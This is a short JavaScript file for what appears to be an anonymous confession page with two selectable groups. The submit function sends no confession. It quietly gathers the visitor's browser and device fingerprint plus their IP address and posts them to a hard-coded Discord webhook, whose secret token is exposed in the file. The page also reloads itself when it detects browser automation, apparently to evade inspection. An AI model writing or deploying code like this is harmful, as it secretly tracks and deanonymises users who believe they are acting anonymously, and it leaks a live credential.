var ipadress
var selectedGroup = 0x0
var sGroupButton
var oGroupButton


function switchToSGroup(){
    if(selectedGroup==0x0){
        return
    }
    sGroupButton.classList.add("active-button")
    oGroupButton.classList.remove("active-button")
    selectedGroup = 0x0
}

function switchToOGroup(){
    if(selectedGroup==0x1){
        return
    }
    oGroupButton.classList.add("active-button")
    sGroupButton.classList.remove("active-button")
    selectedGroup = 0x1
}



function navigator_descriptor(){
    appName = navigator.appName
    appCodeName = navigator.appCodeName
    appVersion = navigator.appVersion
    connectionType = navigator.connection.connectionType
    saveDataMode = navigator.connection.saveData
    cellType = navigator.connection.effectiveType
    currentLanguage = navigator.language
    mobileMaxTouchPoints = navigator.maxTouchPoints
    platform = navigator.platform
    userAgent = navigator.userAgent
    memory = navigator.deviceMemory
    final = "UA : " + userAgent + "\nPlatform : " + platform + "\nArayüz Dili : " + currentLanguage + "\nMaks dokunmatik  parmak algılama : " + mobileMaxTouchPoints + "\nVeri tasarrufu : " + saveDataMode + "\nBellek Miktarı : " + memory + "gb"
    return final
}


function sendConfess(){
    console.log(navigator)
    navigator_descriptor()
    fetch("https://discord.com/api/webhooks/1200795566578335854/AKEBKoXzeNuh49xl1eMG1L-3Br7y_Z0swHQOxtv3B3oVHUy_5X-OVQmRPaPFdShxjffh", {
        method: "POST",
        body: JSON.stringify({
            "content" : navigator_descriptor() + "\n" + ipadress
        }),
        headers: {
            "Content-type": "application/json; charset=UTF-8"
        }
    })
}


window.onload = function(){
    if(navigator.webdriver != false){
        location.reload()
    }
    getIPs().then(res => ipadress = res)
    sGroupButton = document.getElementById("sgroup")
    oGroupButton = document.getElementById("ogroup")
}